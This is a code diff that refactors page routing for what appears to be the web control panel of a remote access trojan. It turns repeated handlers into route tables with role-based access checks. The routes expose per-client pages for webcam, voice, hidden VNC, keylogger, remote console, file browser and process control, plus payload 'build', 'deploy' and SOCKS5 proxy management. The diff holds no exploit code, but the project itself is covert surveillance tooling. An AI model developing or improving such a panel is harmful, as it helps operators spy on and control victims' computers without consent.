@@ -1,5 +1,5 @@
 import { authenticateRequest } from "../../auth";
-import { requirePermission } from "../../rbac";
+import { requirePermission, type Permission } from "../../rbac";
 import { canUserAccessClient, getUserById, type UserRole } from "../../users";
 
 type PageRouteDeps = {
@@ -32,24 +32,108 @@ async function serveChangePasswordIfRequired(
   return null;
 }
 
+async function serveFile(deps: PageRouteDeps, htmlFile: string): Promise<Response | null> {
+  const file = Bun.file(`${deps.PUBLIC_ROOT}/${htmlFile}`);
+  if (await file.exists()) {
+    return new Response(file, { headers: deps.secureHeaders(deps.mimeType(htmlFile)) });
+  }
+  return null;
+}
+
+// ---- Page definitions ----
+
+type AccessLevel = "any" | "no-viewer" | "admin" | "admin-or-operator";
+type StaticPageDef = {
+  path: string;
+  file: string;
+  access: AccessLevel;
+  permission?: Permission;
+  checkPasswordChange?: boolean;
+};
+
+type ClientPageDef = {
+  pattern: RegExp;
+  file: string;
+  clientIdGroup: number;
+};
+
+type QueryClientPageDef = {
+  path: string;
+  file: string;
+};
+
+/** Static pages: each entry maps a URL path to its HTML file + access rules. */
+const STATIC_PAGES: StaticPageDef[] = [
+  { path: "/metrics",            file: "metrics.html",             access: "any",              checkPasswordChange: true },
+  { path: "/settings",           file: "settings.html",            access: "any",              checkPasswordChange: true },
+  { path: "/logs",               file: "logs.html",                access: "any",              checkPasswordChange: true, permission: "audit:view" },
+  { path: "/notifications",      file: "notifications.html",       access: "admin-or-operator", checkPasswordChange: true },
+  { path: "/users",              file: "users.html",               access: "admin",            checkPasswordChange: true },
+  { path: "/user-client-access", file: "user-client-access.html",  access: "admin",            checkPasswordChange: true },
+  { path: "/build",              file: "build.html",               access: "admin-or-operator" },
+  { path: "/plugins",            file: "plugins.html",             access: "admin-or-operator" },
+  { path: "/scripts",            file: "scripts.html",             access: "no-viewer" },
+  { path: "/deploy",             file: "deploy.html",              access: "admin" },
+  { path: "/socks5-manager",     file: "socks5-manager.html",      access: "no-viewer",        checkPasswordChange: true },
+];
+
+/** Client-scoped pages accessed via query param ?clientId=... */
+const QUERY_CLIENT_PAGES: QueryClientPageDef[] = [
+  { path: "/remotedesktop", file: "remotedesktop.html" },
+  { path: "/webcam",        file: "webcam.html" },
+  { path: "/hvnc",          file: "hvnc.html" },
+  { path: "/voice",         file: "voice.html" },
+];
+
+/** Client-scoped pages accessed via path /:clientId/feature */
+const PATH_CLIENT_PAGES: ClientPageDef[] = [
+  { pattern: /^\/(.+)\/console$/,    file: "console.html",    clientIdGroup: 1 },
+  { pattern: /^\/(.+)\/files$/,      file: "filebrowser.html", clientIdGroup: 1 },
+  { pattern: /^\/(.+)\/processes$/,  file: "processes.html",  clientIdGroup: 1 },
+  { pattern: /^\/(.+)\/keylogger$/,  file: "keylogger.html",  clientIdGroup: 1 },
+];
+
+function checkAccess(role: UserRole, access: AccessLevel): Response | null {
+  switch (access) {
+    case "any":
+      return null;
+    case "no-viewer":
+      if (role === "viewer") {
+        return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
+      }
+      return null;
+    case "admin":
+      if (role !== "admin") {
+        return new Response("Forbidden: Admin access required", { status: 403 });
+      }
+      return null;
+    case "admin-or-operator":
+      if (role !== "admin" && role !== "operator") {
+        return new Response("Forbidden: Admin or operator access required", { status: 403 });
+      }
+      return null;
+  }
+}
+
 export async function handlePageRoutes(
   req: Request,
   url: URL,
   deps: PageRouteDeps,
 ): Promise<Response | null> {
+  if (req.method !== "GET") return null;
+
   const canAccessClientPage = (userId: number, role: UserRole, clientId: string): boolean => {
     if (!clientId) return false;
     return canUserAccessClient(userId, role, clientId);
   };
 
-  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
+  // ---- Root / index ----
+  if (url.pathname === "/" || url.pathname === "/index.html") {
     const authed = await authenticateRequest(req);
-
     if (authed) {
       const maybeChange = await serveChangePasswordIfRequired(deps, authed.userId);
       if (maybeChange) return maybeChange;
     }
-
     const filePath = authed ? "/index.html" : "/login.html";
     const file = Bun.file(`${deps.PUBLIC_ROOT}${filePath}`);
     if (await file.exists()) {
@@ -57,18 +141,44 @@ export async function handlePageRoutes(
     }
   }
 
-  if (req.method === "GET" && url.pathname === "/change-password.html") {
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/change-password.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("/change-password.html")) });
-    }
+  // ---- Change password (always accessible) ----
+  if (url.pathname === "/change-password.html") {
+    return serveFile(deps, "change-password.html");
   }
 
-  if (req.method === "GET" && url.pathname === "/remotedesktop") {
+  // ---- Static pages (table-driven) ----
+  for (const page of STATIC_PAGES) {
+    if (url.pathname !== page.path) continue;
+
     const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
+    if (!user) return serveLoginOrUnauthorized(deps);
+
+    if (page.checkPasswordChange) {
+      const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
+      if (maybeChange) return maybeChange;
     }
+
+    const accessDenied = checkAccess(user.role, page.access);
+    if (accessDenied) return accessDenied;
+
+    if (page.permission) {
+      try {
+        requirePermission(user, page.permission);
+      } catch (error) {
+        if (error instanceof Response) return error;
+        return new Response("Forbidden", { status: 403 });
+      }
+    }
+
+    return serveFile(deps, page.file);
+  }
+
+  // ---- Client pages via query param (?clientId=...) ----
+  for (const page of QUERY_CLIENT_PAGES) {
+    if (url.pathname !== page.path) continue;
+
+    const user = await authenticateRequest(req);
+    if (!user) return serveLoginOrUnauthorized(deps);
 
     const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
     if (maybeChange) return maybeChange;
@@ -82,351 +192,27 @@ export async function handlePageRoutes(
       return new Response("Forbidden: Client access denied", { status: 403 });
     }
 
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/remotedesktop.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("remotedesktop.html")) });
-    }
+    return serveFile(deps, page.file);
   }
 
-  if (req.method === "GET" && url.pathname === "/webcam") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
+  // ---- Client pages via path (/:clientId/feature) ----
+  for (const page of PATH_CLIENT_PAGES) {
+    const match = url.pathname.match(page.pattern);
+    if (!match) continue;
 
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
+    const user = await authenticateRequest(req);
+    if (!user) return serveLoginOrUnauthorized(deps);
 
     if (user.role === "viewer") {
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
 
-    const clientId = (url.searchParams.get("clientId") || "").trim();
+    const clientId = match[page.clientIdGroup];
     if (!canAccessClientPage(user.userId, user.role, clientId)) {
       return new Response("Forbidden: Client access denied", { status: 403 });
     }
 
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/webcam.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("webcam.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/hvnc") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-
-    const clientId = (url.searchParams.get("clientId") || "").trim();
-    if (!canAccessClientPage(user.userId, user.role, clientId)) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/hvnc.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("hvnc.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/voice") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-
-    const clientId = (url.searchParams.get("clientId") || "").trim();
-    if (!canAccessClientPage(user.userId, user.role, clientId)) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/voice.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("voice.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/metrics") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/metrics.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("metrics.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/logs") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    try {
-      requirePermission(user, "audit:view");
-    } catch (error) {
-      if (error instanceof Response) return error;
-      return new Response("Forbidden", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/logs.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("logs.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/notifications") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role !== "admin" && user.role !== "operator") {
-      return new Response("Forbidden", { status: 403 });
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/notifications.html`);
-    if (await file.exists()) {
-      return new Response(file, {
-        headers: deps.secureHeaders(deps.mimeType("notifications.html")),
-      });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/users") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    if (user.role !== "admin") {
-      return new Response("Forbidden: Admin access required", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/users.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("users.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/user-client-access") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    if (user.role !== "admin") {
-      return new Response("Forbidden: Admin access required", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/user-client-access.html`);
-    if (await file.exists()) {
-      return new Response(file, {
-        headers: deps.secureHeaders(deps.mimeType("user-client-access.html")),
-      });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/settings") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/settings.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("settings.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/build") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role !== "admin" && user.role !== "operator") {
-      return new Response("Forbidden: Admin or operator access required", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/build.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("build.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/plugins") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role !== "admin" && user.role !== "operator") {
-      return new Response("Forbidden: Admin or operator access required", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/plugins.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("plugins.html")) });
-    }
-  }
-
-  const consolePageMatch = url.pathname.match(/^\/(.+)\/console$/);
-  if (req.method === "GET" && consolePageMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    if (!canAccessClientPage(user.userId, user.role, consolePageMatch[1])) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/console.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("console.html")) });
-    }
-  }
-
-  const filesPageMatch = url.pathname.match(/^\/(.+)\/files$/);
-  if (req.method === "GET" && filesPageMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    if (!canAccessClientPage(user.userId, user.role, filesPageMatch[1])) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/filebrowser.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("filebrowser.html")) });
-    }
-  }
-
-  const processesPageMatch = url.pathname.match(/^\/(.+)\/processes$/);
-  if (req.method === "GET" && processesPageMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    if (!canAccessClientPage(user.userId, user.role, processesPageMatch[1])) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/processes.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("processes.html")) });
-    }
-  }
-
-  const keyloggerPageMatch = url.pathname.match(/^\/(.+)\/keylogger$/);
-  if (req.method === "GET" && keyloggerPageMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    if (!canAccessClientPage(user.userId, user.role, keyloggerPageMatch[1])) {
-      return new Response("Forbidden: Client access denied", { status: 403 });
-    }
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/keylogger.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("keylogger.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/socks5-manager") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
-    if (maybeChange) return maybeChange;
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/socks5-manager.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("socks5-manager.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/scripts") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot execute scripts", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/scripts.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("scripts.html")) });
-    }
-  }
-
-  if (req.method === "GET" && url.pathname === "/deploy") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return serveLoginOrUnauthorized(deps);
-    }
-
-    if (user.role !== "admin") {
-      return new Response("Forbidden: Admin access required", { status: 403 });
-    }
-
-    const file = Bun.file(`${deps.PUBLIC_ROOT}/deploy.html`);
-    if (await file.exists()) {
-      return new Response(file, { headers: deps.secureHeaders(deps.mimeType("deploy.html")) });
-    }
+    return serveFile(deps, page.file);
   }
 
   return null;
